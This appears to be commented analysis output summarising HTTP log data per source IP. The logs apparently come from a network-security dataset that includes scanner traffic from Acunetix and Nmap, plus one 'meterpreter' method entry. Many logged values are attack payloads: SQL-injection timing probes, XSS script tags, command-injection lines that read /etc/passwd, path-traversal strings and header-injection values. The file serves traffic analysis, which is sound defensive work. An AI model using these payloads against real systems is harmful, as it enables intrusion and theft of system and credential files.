\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\ ...
#  '62NHJwWk'
#  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)' and sleep(4)='"
#  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)" and sleep(4)="'
#  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)' or (sleep(4)+1) limit 1 --"
#  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)" or (sleep(4)+1) limit 1 --'
#  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)'=sleep(4)='"
#  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)"=sleep(4)="'
#  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)'; waitfor delay '0:0:4' --"
#  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)"; waitfor delay \'0:0:4\' --'
#  'UFc5UTlydXcxUTRqcEdvWg==' 'index.php' 'index.php/.' 'Tv6y3zIh'
#  '\'"()&%1<ScRiPt >prompt(969975)</ScRiPt>' 'OTQxODk5'
#  'ZVVIWDVBOENlVHkwYkxZQg==' 'phpmyadmin.css.php' 'phpmyadmin.css.php/.'
#  'jxQLBwtB' '\'"()&%1<ScRiPt >prompt(921561)</ScRiPt>' 'OTE3MjM5'
#  'MUxiOENscHBndVVORWFLbA==' 'Documentation.html' 'Documentation.html/.'
#  '\'"()&%1<ScRiPt >prompt(975146)</ScRiPt>' 'OTA4MTA4' '0Eh6buTm']
# Status Code:  [404. 200. 400.  nan 401. 405. 501. 403. 406. 417. 301. 302.]
# Status Message:  ['NOT FOUND' 'OK' 'Bad Request' nan 'UNAUTHORIZED' 'Not Found'
#  'Not Allowed' 'METHOD NOT ALLOWED' 'Method Not Implemented'
#  'Method Not Allowed' 'Forbidden' 'Not Acceptable' 'Expectation Failed'
#  'Moved Permanently' 'Found' 'Authorization Required']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan
#  "CLIENT-IP -> ' UNION SELECT 'vulnerability_test_input'\\x2c1\\x2c1\\x2c1/*"
#  'CLIENT-IP -> SomeCustomInjectedHeader:injected_by_wvs'
#  'X-FORWARDED-FOR -> SomeCustomInjectedHeader:injected_by_wvs'
#  'CLIENT-IP -> http://some-inexistent-website.acu/some_inexistent_file_with_long_name'
#  'CLIENT-IP -> 1some_inexistent_file_with_long_name'
#  'CLIENT-IP -> http://testphp.vulnweb.com/acunetix_file_inclusion_test?'
#  'X-FORWARDED-FOR -> http://some-inexistent-website.acu/some_inexistent_file_with_long_name'
#  'CLIENT-IP -> )'
#  'X-FORWARDED-FOR -> 1some_inexistent_file_with_long_name'
#  'X-FORWARDED-FOR -> http://testphp.vulnweb.com/acunetix_file_inclusion_test?'
#  'CLIENT-IP -> !(()&&!|*|*|' 'CLIENT-IP -> ^(#$!@#$)(()))******'
#  'X-FORWARDED-FOR -> )' 'X-FORWARDED-FOR -> !(()&&!|*|*|'
#  'X-FORWARDED-FOR -> ^(#$!@#$)(()))******' 'CLIENT-IP -> &cat /etc/passwd'
#  'CLIENT-IP -> &cat /etc/passwd&' 'CLIENT-IP -> 268435455'
#  'CLIENT-IP -> 1e309' 'CLIENT-IP -> cat /etc/passwd'
#  'CLIENT-IP -> \'"\'");|]*{%0d%0a<%00>' 'X-FORWARDED-FOR -> 268435455'
#  'CLIENT-IP -> acunetix_wvs_invalid_filename' 'CLIENT-IP -> login'
#  'CLIENT-IP -> login/.' 'X-FORWARDED-FOR -> acunetix_wvs_invalid_filename'
#  'X-FORWARDED-FOR -> login' 'X-FORWARDED-FOR -> login/.' "CLIENT-IP -> 1'"
#  'CLIENT-IP -> \\xc0 xa7' 'CLIENT-IP -> 1"' 'CLIENT-IP -> \\xc0\\xa2'
#  'CLIENT-IP -> JyI=' 'CLIENT-IP -> \\xbf\'\\xbf"'
#  'CLIENT-IP -> \\xf0\'\'\\xf0""' "X-FORWARDED-FOR -> 1'"
#  'X-FORWARDED-FOR -> \\xc0 xa7' 'X-FORWARDED-FOR -> 1"'
#  'X-FORWARDED-FOR -> \\xc0\\xa2' 'X-FORWARDED-FOR -> JyI='
#  'X-FORWARDED-FOR -> \\xbf\'\\xbf"' 'X-FORWARDED-FOR -> \\xf0\'\'\\xf0""'
#  'CLIENT-IP -> //www.acunetix.tst' 'X-FORWARDED-FOR -> //www.acunetix.tst'
#  'CLIENT-IP -> \'"' 'CLIENT-IP -> <!--' 'X-FORWARDED-FOR -> \'"'
#  'X-FORWARDED-FOR -> <!--'
#  'CLIENT-IP -> \'"()&%1<ScRiPt >prompt(947550)</ScRiPt>'
#  'CLIENT-IP -> OTMxODgy'
#  'X-FORWARDED-FOR -> \'"()&%1<ScRiPt >prompt(978116)</ScRiPt>'
#  'X-FORWARDED-FOR -> OTY4NzMw'
#  'CLIENT-IP -> print(md5(acunetix_wvs_security_test));die();/*'
#  'CLIENT-IP -> ${@print(md5(acunetix_wvs_security_test))}'
#  'CLIENT-IP -> ${@print(md5(acunetix_wvs_security_test))}\\'
#  'X-FORWARDED-FOR -> print(md5(acunetix_wvs_security_test));die();/*'
#  'X-FORWARDED-FOR -> ${@print(md5(acunetix_wvs_security_test))}'
#  'X-FORWARDED-FOR -> ${@print(md5(acunetix_wvs_security_test))}\\'
#  'X-FORWARDED-FOR -> 1e309' 'X-FORWARDED-FOR -> \'"\'");|]*{%0d%0a<%00>'
#  'CLIENT-IP -> `cat /etc/passwd`' 'CLIENT-IP -> |cat /etc/passwd#'
#  'CLIENT-IP -> ;cat /etc/passwd;' 'CLIENT-IP -> ||cat /etc/passwd'
#  'CLIENT-IP -> &dir' 'CLIENT-IP -> |dir'
#  'X-FORWARDED-FOR -> &cat /etc/passwd'
#  'X-FORWARDED-FOR -> &cat /etc/passwd&'
#  'X-FORWARDED-FOR -> cat /etc/passwd'
#  'X-FORWARDED-FOR -> `cat /etc/passwd`'
#  'X-FORWARDED-FOR -> |cat /etc/passwd#'
#  'X-FORWARDED-FOR -> ;cat /etc/passwd;'
#  'X-FORWARDED-FOR -> ||cat /etc/passwd' 'X-FORWARDED-FOR -> &dir'
#  'X-FORWARDED-FOR -> |dir'
#  'CLIENT-IP -> ../../../../../../../../../../etc/passwd'
#  'CLIENT-IP -> ../../../../../../../../../../etc/passwd%00.png'
#  'CLIENT-IP -> /../..//../..//../..//../..//../..//etc/passwd%00'
#  'CLIENT-IP -> .\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd'
#  'CLIENT-IP -> /etc/passwd'
#  'CLIENT-IP -> ../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd'
#  'CLIENT-IP -> ../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd'
#  'CLIENT-IP -> ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd'
#  'CLIENT-IP -> invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././. ...
#  'CLIENT-IP -> file:///etc/passwd'
#  'CLIENT-IP -> /\\../\\../\\../\\../\\../\\../\\../etc/passwd'
#  'CLIENT-IP -> ../../../../../../../../../../windows/win.ini'
#  'CLIENT-IP -> c:/windows/win.ini'
#  'CLIENT-IP -> ../../../../../../../../../../windows/win.ini%00'
#  'CLIENT-IP -> %c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afwindows%c0%afwin.ini'
#  'CLIENT-IP -> ..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini'
#  'CLIENT-IP -> /.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./windows/win.ini'
#  'CLIENT-IP -> ../..//../..//../..//../..//../..//../..//../..//../..//windows/win.ini'
#  'CLIENT-IP -> ../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././windows/win.ini'
#  'CLIENT-IP -> unexisting/../../../../../../../../../../windows/win.ini.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\ ...
#  'X-FORWARDED-FOR -> ../../../../../../../../../../etc/passwd'
#  'X-FORWARDED-FOR -> ../../../../../../../../../../etc/passwd%00.png'
#  'X-FORWARDED-FOR -> /../..//../..//../..//../..//../..//etc/passwd%00'
#  'X-FORWARDED-FOR -> .\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd'
#  'X-FORWARDED-FOR -> /etc/passwd'
#  'X-FORWARDED-FOR -> ../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd'
#  'X-FORWARDED-FOR -> ../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd'
#  'X-FORWARDED-FOR -> ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd'
# ...
#  'CLIENT-IP -> 1" or (sleep(4)+1) limit 1 --' "CLIENT-IP -> 1'=sleep(4)='"
#  'CLIENT-IP -> 1"=sleep(4)="' "CLIENT-IP -> 1; waitfor delay '0:0:4' --"
#  "CLIENT-IP -> 1'; waitfor delay '0:0:4' --"
#  'CLIENT-IP -> 1"; waitfor delay \'0:0:4\' --' 'X-FORWARDED-FOR -> 1'
#  'X-FORWARDED-FOR -> 2' 'X-FORWARDED-FOR -> 1 and sleep(4)'
#  'X-FORWARDED-FOR -> 1 or (sleep(4)+1) limit 1 --'
#  "X-FORWARDED-FOR -> 1' and sleep(4)='"
#  'X-FORWARDED-FOR -> 1" and sleep(4)="'
#  "X-FORWARDED-FOR -> 1' or (sleep(4)+1) limit 1 --"
#  'X-FORWARDED-FOR -> 1" or (sleep(4)+1) limit 1 --'
#  "X-FORWARDED-FOR -> 1'=sleep(4)='" 'X-FORWARDED-FOR -> 1"=sleep(4)="'
#  "X-FORWARDED-FOR -> 1; waitfor delay '0:0:4' --"
#  "X-FORWARDED-FOR -> 1'; waitfor delay '0:0:4' --"
#  'X-FORWARDED-FOR -> 1"; waitfor delay \'0:0:4\' --'
#  'CLIENT-IP -> index.php' 'CLIENT-IP -> index.php/.'
#  'X-FORWARDED-FOR -> index.php'
#  'CLIENT-IP -> \'"()&%1<ScRiPt >prompt(956349)</ScRiPt>'
#  'X-FORWARDED-FOR -> index.php/.' 'CLIENT-IP -> OTU3NDY1'
#  'X-FORWARDED-FOR -> \'"()&%1<ScRiPt >prompt(920385)</ScRiPt>'
#  'X-FORWARDED-FOR -> OTgzOTIx' 'CLIENT-IP -> phpmyadmin.css.php'
#  'CLIENT-IP -> phpmyadmin.css.php/.'
#  'X-FORWARDED-FOR -> phpmyadmin.css.php'
#  'CLIENT-IP -> \'"()&%1<ScRiPt >prompt(919443)</ScRiPt>'
#  'CLIENT-IP -> OTcwODg5' 'X-FORWARDED-FOR -> phpmyadmin.css.php/.'
#  'X-FORWARDED-FOR -> \'"()&%1<ScRiPt >prompt(927162)</ScRiPt>'
#  'X-FORWARDED-FOR -> OTA3NjM1' 'CLIENT-IP -> Documentation.html'
#  'CLIENT-IP -> Documentation.html/.'
#  'CLIENT-IP -> \'"()&%1<ScRiPt >prompt(954186)</ScRiPt>'
#  'X-FORWARDED-FOR -> Documentation.html' 'CLIENT-IP -> OTQ4Nzk2'
#  'X-FORWARDED-FOR -> \'"()&%1<ScRiPt >prompt(920893)</ScRiPt>'
#  'X-FORWARDED-FOR -> OTkyMzk1' 'X-FORWARDED-FOR -> Documentation.html/.']
#
#
#
# IP:  2001:dbb:c18:202:20c:29ff:fe93:571e
#
# Method:  ['GET' 'TRACE' 'OPTIONS' 'HEAD' 'POST' 'CONNECT' nan]
# User Agent:  [nan
#  'Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)']
# Status Code:  [200. 400. 302. 503.  nan 404. 403. 405.]
# Status Message:  ['OK' 'Bad Request' 'Found' 'Service Unavailable' nan 'Not Found'
#  'Forbidden' 'Method Not Allowed']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
# IP:  192.168.202.109
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2']
# Status Code:  [200. 302. 304. 403. 404. 401.]
# Status Message:  ['OK' 'Found' 'Not Modified' 'Forbidden' 'Not Found'
#  'Authorization Required']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.4
#
# Method:  ['GET' nan 'OPTIONS' 'HEAD' 'CONNECT' 'PROPFIND']
# User Agent:  [nan
#  'Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)'
#  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)']
# Status Code:  [200. 302. 403. 400.  nan 503. 404. 303. 500. 405.]
# Status Message:  ['OK' 'Found' 'Forbidden' '<empty>' nan 'Bad Request'
#  'Service Unavailable' 'Not Found' 'See Other' 'NOT FOUND'
#  'Internal Server Error' 'Method Not Allowed']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan 'VIA -> SIP/2.0/TCP nm;branch=foo']
#
#
#
# IP:  192.168.23.254
#
# Method:  ['GET']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2']
# Status Code:  [200.]
# Status Message:  ['OK']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.88
#
# Method:  ['meterpreter']
# User Agent:  [nan]
# Status Code:  [nan]
# Status Message:  [nan]
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.98
#
# Method:  ['GET']
# User Agent:  ['Wget/1.12 (linux-gnu)']
# Status Code:  [200.]
# Status Message:  ['OK']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.23.100
#
# Method:  ['POST']
# User Agent:  ['Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1']
# Status Code:  [200.]
# Status Message:  ['OK']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.22.100
#
# Method:  ['POST']
# User Agent:  ['Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1']
# Status Code:  [500.  nan 200.]
# Status Message:  ['Internal Server Error' nan 'OK']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.133
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2'
#  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)']
# Status Code:  [302. 200. 304.  nan]
# Status Message:  ['Found' 'OK' 'Not Modified' nan]
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.91
#
# Method:  ['GET']
# User Agent:  [nan]
# Status Code:  [301.]
# Status Message:  ['Moved Permanently']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.68
#
# Method:  ['GET']
# User Agent:  ['Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' nan]
# Status Code:  [200. 403.  nan 400.]
# Status Message:  ['OK' 'Forbidden' nan 'Bad Request']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan 'PROXY-CONNECTION -> Keep-Alive']
#
#
#
# IP:  192.168.204.60
#
# Method:  ['GET']
# User Agent:  ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:10.0.2) Gecko/20100101 Firefox/10.0.2']
# Status Code:  [404. 401. 200. 304.]
# Status Message:  ['Not Found' 'Authorization Required' 'OK' 'Not Modified']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.135
#
# Method:  ['GET']
# User Agent:  ['Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)']
# Status Code:  [nan]
# Status Message:  [nan]
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.203.66
#
# Method:  ['GET']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2']
# Status Code:  [200. 404.]
# Status Message:  ['OK' 'Not Found']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.138
#
# Method:  ['GET' 'POST' 'CONNECT' 'GNUTELLA' 'Secure' 'EVCSSO' 'JHAIBC' 'some'
#  'AJSUHL' 'OPTIONS' 'ACL' 'BASELINE-CONTROL' 'BCOPY' 'BDELETE' 'BMOVE'
#  'BPROPFIND' 'BPROPPATCH' 'CHECKIN' 'CHECKOUT' 'COPY' 'DEBUG' 'DELETE'
#  'HEAD' 'INDEX' 'LABEL' 'LOCK' 'MERGE' 'MKACTIVITY' 'MKCOL' 'MKWORKSPACE'
#  'MOVE' 'NOTIFY' 'ORDERPATCH' 'PATCH' 'POLL' 'PROPFIND' 'PROPPATCH' 'PUT'
#  'REPORT' 'RPC_IN_DATA' 'RPC_OUT_DATA' 'SEARCH' 'SUBSCRIBE' 'TESTZZZ'
#  'TRACE' 'UNCHECKOUT' 'UNLOCK' 'UNSUBSCRIBE' 'UPDATE' 'VERSION-CONTROL'
